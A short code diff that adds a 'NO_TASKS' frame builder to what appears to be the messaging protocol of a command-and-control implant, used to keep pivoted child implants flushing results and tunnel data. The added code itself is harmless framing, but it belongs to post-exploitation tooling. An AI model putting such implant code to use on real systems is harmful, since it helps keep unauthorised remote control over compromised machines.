@@ -145,6 +145,16 @@ int nax_build_heartbeat(uint8_t *out, uint32_t *out_len)
     return nax_frame_encode(NAX_WIRE_HEARTBEAT, NULL, 0, out, out_len);
 }
 
+/* ===== NO_TASKS tick for pivot children =====
+ * Sent by the parent to each bind child on every heartbeat cycle so the
+ * child can drain its async BOF results and tunnel data without needing
+ * an actual task from the C2.  The bind side already handles NO_TASKS —
+ * it breaks out of the frame loop and loops back to flush pending output. */
+int nax_build_no_tasks(uint8_t *out, uint32_t *out_len)
+{
+    return nax_frame_encode(NAX_WIRE_NO_TASKS, NULL, 0, out, out_len);
+}
+
 /* ===== RESULT ===== */
 /*
  * RESULT frame body: task_id(4) + status(1) + data_len(4) + data
